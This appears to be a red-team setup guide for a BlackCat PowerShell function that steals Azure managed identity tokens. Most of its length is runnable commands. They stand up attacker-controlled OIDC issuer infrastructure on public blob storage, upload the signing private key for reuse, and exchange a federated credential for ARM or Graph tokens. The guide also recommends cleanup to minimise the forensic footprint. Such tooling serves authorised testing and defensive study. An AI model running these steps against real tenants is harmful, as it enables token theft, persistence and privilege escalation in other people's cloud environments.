# Invoke-FederatedTokenExchange Setup Guide

This guide walks you through setting up the OIDC issuer infrastructure needed for `Invoke-FederatedTokenExchange`.

---

## Overview

Unlike `Get-ManagedIdentityToken` (which creates ACI containers), this approach uses **federated identity credentials** with a custom OIDC issuer hosted on Azure Storage. This is faster and avoids ACI capacity issues.

**One-time setup:** ~10 minutes
**Subsequent token extractions:** ~20 seconds

---

## Quick Start (Automated)

**Pure PowerShell — no external tools needed!**

```powershell
# 1. Ensure BlackCat module is loaded and authenticated
Import-Module ./BlackCat.psd1 -Force
Connect-AzAccount

# 2. Run automated setup (generates key, creates storage, uploads OIDC metadata + private key)
./Attacks/Federated-Token-Exchange/Setup-FederatedTokenExchange.ps1

# 3. Extract tokens (private key auto-downloaded from issuer URL - no local file needed!)
Invoke-FederatedTokenExchange `
    -Name "your-uami" `
    -ResourceGroupName "your-rg" `
    -IssuerUrl "https://bcoidc12345678.blob.core.windows.net/oidc" `
    -Cleanup

# 4. Extract a Graph token instead of ARM
Invoke-FederatedTokenExchange `
    -Name "your-uami" `
    -IssuerUrl "https://bcoidc12345678.blob.core.windows.net/oidc" `
    -EndpointType MSGraph `
    -Decode -Cleanup

# 5. Or use local private key file if preferred
Invoke-FederatedTokenExchange `
    -Name "your-uami" `
    -IssuerUrl "https://bcoidc12345678.blob.core.windows.net/oidc" `
    -PrivateKeyPath "./blackcat-oidc.pem" `
    -Cleanup
```

---

## Manual Setup (Step-by-Step)

If you prefer manual control, follow Steps 1–5 below.

### Step 1: Generate RSA Key Pair

**Option A: OpenSSL**

```bash
openssl genrsa -out blackcat-oidc.pem 2048
```

**Option B: Pure PowerShell (.NET)**

```powershell
$rsa    = [Security.Cryptography.RSA]::Create(2048)
$keyB64 = [Convert]::ToBase64String($rsa.ExportPkcs8PrivateKey())

$pemLines = @('-----BEGIN PRIVATE KEY-----')
for ($i = 0; $i -lt $keyB64.Length; $i += 64) {
    $len = [Math]::Min(64, $keyB64.Length - $i)
    $pemLines += $keyB64.Substring($i, $len)
}
$pemLines += '-----END PRIVATE KEY-----'
$pemLines -join "`n" | Set-Content './blackcat-oidc.pem' -NoNewline
$rsa.Dispose()
```

**Store `blackcat-oidc.pem` securely** — this is your signing key.

---

### Step 2: Create Storage Account

```powershell
Connect-AzAccount

$ctx            = Get-AzContext
$armUri         = 'https://management.azure.com'
$subscriptionId = $ctx.Subscription.Id
$rgName         = 'rg-blackcat-oidc'
$location       = 'westus'

# Generate unique name
$suffix      = -join ((97..122) + (48..57) | Get-Random -Count 8 | ForEach-Object { [char]$_ })
$storageName = "bcoidc$suffix"

# Get ARM token
$tok   = Get-AzAccessToken -ResourceUrl $armUri -ErrorAction Stop
$plain = ConvertFrom-SecureString -SecureString $tok.Token -AsPlainText
$auth  = @{ 'Authorization' = "Bearer $plain"; 'Content-Type' = 'application/json' }

# Create resource group
$rgUri  = "$armUri/subscriptions/$subscriptionId/resourceGroups/${rgName}?api-version=2021-04-01"
$rgBody = @{ location = $location } | ConvertTo-Json
Invoke-RestMethod -Uri $rgUri -Headers $auth -Method PUT -Body $rgBody -ContentType 'application/json'

# Create storage account with public blob access
$storageApi = '2023-05-01'
$storageUri = ("$armUri/subscriptions/$subscriptionId" +
    "/resourceGroups/$rgName/providers/Microsoft.Storage" +
    "/storageAccounts/${storageName}?api-version=$storageApi")

$storageBody = @{
    kind     = 'StorageV2'
    location = $location
    sku      = @{ name = 'Standard_LRS' }
    properties = @{
        allowBlobPublicAccess    = $true
        minimumTlsVersion        = 'TLS1_2'
        supportsHttpsTrafficOnly = $true
    }
} | ConvertTo-Json -Depth 5

Invoke-RestMethod -Uri $storageUri -Headers $auth -Method PUT -Body $storageBody -ContentType 'application/json'

Write-Host "Issuer URL: https://$storageName.blob.core.windows.net/oidc"
```

**Note the issuer URL** — you'll use this with `-IssuerUrl`.

---

### Step 3: Generate JWKS (JSON Web Key Set)

```powershell
$pemContent = Get-Content './blackcat-oidc.pem' -Raw
$pemClean   = $pemContent -replace '-----(?:BEGIN|END).*-----', '' -replace '\s', ''
$keyBytes   = [Convert]::FromBase64String($pemClean)

$rsa = [Security.Cryptography.RSA]::Create()
$rsa.ImportPkcs8PrivateKey($keyBytes, [ref]$null)
$pub = $rsa.ExportParameters($false)

function ConvertTo-Base64Url ([byte[]]$Bytes) {
    [Convert]::ToBase64String($Bytes).TrimEnd('=').Replace('+','-').Replace('/','_')
}

$keyId = [guid]::NewGuid().ToString()
$jwks = @{
    keys = @(@{
        kty = 'RSA'; use = 'sig'; alg = 'RS256'
        kid = $keyId
        n   = ConvertTo-Base64Url -Bytes $pub.Modulus
        e   = ConvertTo-Base64Url -Bytes $pub.Exponent
    })
} | ConvertTo-Json -Depth 5
$jwks | Out-File './jwks.json' -Encoding utf8 -NoNewline
$rsa.Dispose()

Write-Host "JWKS saved (kid: $keyId)"
```

---

### Step 4: Create OIDC Discovery Document

```powershell
$storageName = "bcoidc1a2b3c4d"  # Your storage account name
$issuerUrl   = "https://${storageName}.blob.core.windows.net/oidc"

$discovery = @{
    issuer                                = $issuerUrl
    jwks_uri                              = "$issuerUrl/jwks"
    response_types_supported              = @('id_token')
    subject_types_supported               = @('public')
    id_token_signing_alg_values_supported = @('RS256')
} | ConvertTo-Json -Compress

$discovery | Out-File './openid-configuration' -Encoding utf8 -NoNewline
```

---

### Step 5: Upload Files to Blob Storage

Upload using the Azure Storage REST API with SharedKey authentication. The setup script includes a `New-SharedKeySignature` helper that builds the required 13-field canonical signing string — see [Setup-FederatedTokenExchange.ps1](Setup-FederatedTokenExchange.ps1) for the implementation.

```powershell
# Get storage account key
$keysUri = ("$armUri/subscriptions/$subscriptionId" +
    "/resourceGroups/$rgName/providers/Microsoft.Storage" +
    "/storageAccounts/$storageName/listKeys?api-version=$storageApi")

$keys       = Invoke-RestMethod -Uri $keysUri -Headers $auth -Method POST
$accountKey = $keys.keys[0].value
$blobBase   = "https://${storageName}.blob.core.windows.net"

# Upload helper using SharedKey (13-field canonical string)
function Upload-Blob ($BlobName, $Content) {
    $bytes = [Text.Encoding]::UTF8.GetBytes($Content)
    $date  = [DateTime]::UtcNow.ToString('R')

    # SharedKey requires 13 header fields joined by newlines.
    # Empty optional headers produce blank lines in the string.
    $canon   = "x-ms-blob-type:BlockBlob`nx-ms-date:$date`nx-ms-version:2021-06-08"
    $fields  = @('PUT','','',($bytes.Length).ToString(),'','application/json',
                 '','','','','','', $canon, "/$storageName/oidc/$BlobName")
    $signStr = $fields -join "`n"

    $hmac = [Security.Cryptography.HMACSHA256]::new([Convert]::FromBase64String($accountKey))
    $sig  = [Convert]::ToBase64String($hmac.ComputeHash([Text.Encoding]::UTF8.GetBytes($signStr)))

    Invoke-RestMethod -Uri "$blobBase/oidc/$BlobName" -Method PUT -Body $bytes -Headers @{
        'x-ms-date' = $date; 'x-ms-version' = '2021-06-08'; 'x-ms-blob-type' = 'BlockBlob'
        'Content-Type' = 'application/json'; 'Authorization' = "SharedKey ${storageName}:$sig"
    }
}

Upload-Blob 'jwks' (Get-Content './jwks.json' -Raw)
Upload-Blob '.well-known/openid-configuration' (Get-Content './openid-configuration' -Raw)
```

**Verify public access:**

```powershell
Invoke-RestMethod "https://$storageName.blob.core.windows.net/oidc/jwks"
Invoke-RestMethod "https://$storageName.blob.core.windows.net/oidc/.well-known/openid-configuration"
```

---

## Step 6: Use the Function

```powershell
Import-Module ./BlackCat.psd1 -Force

# Private key auto-downloaded from issuer URL (recommended for attack scenarios)
Invoke-FederatedTokenExchange `
    -Name "uami-backup-service" `
    -ResourceGroupName "rg-shared-services" `
    -IssuerUrl "https://bcoidc1a2b3c4d.blob.core.windows.net/oidc" `
    -Cleanup -Decode

# Or use local private key file
Invoke-FederatedTokenExchange `
    -Name "uami-backup-service" `
    -ResourceGroupName "rg-shared-services" `
    -IssuerUrl "https://bcoidc1a2b3c4d.blob.core.windows.net/oidc" `
    -PrivateKeyPath "./blackcat-oidc.pem" `
    -Cleanup -Decode

# Extract Graph token with auto-downloaded key
Invoke-FederatedTokenExchange `
    -Name "uami-prod-automation" `
    -ResourceGroupName "rg-prod" `
    -IssuerUrl "https://bcoidc1a2b3c4d.blob.core.windows.net/oidc" `
    -EndpointType MSGraph `
    -Cleanup -Decode
```

---

## File Structure

After setup, you should have:

```
blackcat-oidc.pem              ← Private key (keep secure!)
jwks.json                      ← Public key in JWKS format
openid-configuration           ← OIDC discovery document

Azure Storage:
  bcoidc1a2b3c4d (account)
  └── oidc (container, public blob access)
      ├── jwks
      ├── .well-known/openid-configuration
      └── blackcat-oidc.pem            ← Auto-downloaded by function
```

**Note:** The private key is uploaded to blob storage for attack scenario reuse. This allows `Invoke-FederatedTokenExchange` to work without requiring the local PEM file — simply provide the `-IssuerUrl` and the function downloads the key automatically.

---

## Comparison: Deployment Scripts vs Federated Exchange

| Feature | Get-ManagedIdentityToken | Invoke-FederatedTokenExchange |
|---------|-------------------------|-------------------------------|
| **Setup** | None (instant) | One-time (~10 min) |
| **Execution Time** | 120-180s (ACI provisioning) | 20-30s (HTTP POST only) |
| **Capacity Issues** | Yes (ACI quota/region) | No (relies on Entra ID) |
| **Artifacts** | Deployment script resource | FIC (cleaned with -Cleanup) |
| **Dependencies** | Azure Container Instances | Azure Storage (public blob) |
| **Best For** | Quick one-off extraction | Repeated/automated extraction |

---

## Troubleshooting

### "Failed to download private key"
- Verify private key is publicly accessible: `curl https://yourblob.blob.core.windows.net/oidc/blackcat-oidc.pem`
- Check container has **public blob access** (not private)
- If you prefer local keys, use `-PrivateKeyPath "./blackcat-oidc.pem"`

### "Private key not found"
- Only occurs when using `-PrivateKeyPath` parameter
- Check the path: use absolute path if needed
- Or omit `-PrivateKeyPath` to auto-download from issuer URL

### "Failed to detect KeyId"
- Verify JWKS is publicly accessible: `curl https://yourblob.blob.core.windows.net/oidc/jwks`
- Check discovery doc: `curl https://yourblob.blob.core.windows.net/oidc/.well-known/openid-configuration`
- Ensure container has **public blob access** (not private)

### "Token exchange returned no token"
- FIC propagation can take 15-30s — the function retries automatically (3 attempts with backoff)
- Verify issuer URL matches exactly (no trailing slash)
- Check Azure AD audit logs for token exchange failures

### "Storage account naming conflict"
- Storage names must be globally unique, 3-24 lowercase alphanumeric chars
- The setup script auto-generates random 8-char suffixes

---

## Security Considerations

1. **Private key exposure**: The private key is uploaded to public blob storage for attack scenario reusability. This is **intentional for red team operations** — the entire OIDC infrastructure is attacker-controlled. In production scenarios, never expose private signing keys publicly.
2. **Attack infrastructure**: This setup creates persistent attacker infrastructure that can be reused across multiple engagements without carrying key files.
3. **Public blob access**: Required for Entra ID to fetch JWKS and for the function to download the private key. Only the storage account owner can delete/modify blobs.
4. **Cleanup**: Use `-Cleanup` to remove federated credentials after extraction to minimize forensic footprint.
5. **Rotation**: Regenerate key pair periodically and update JWKS + blackcat-oidc.pem blobs.
6. **Monitoring**: Check FICs on UAMIs (`Set-FederatedIdentity -Get`) for unauthorized entries.

---

**Questions? See the function help:**

```powershell
Get-Help Invoke-FederatedTokenExchange -Detailed
```
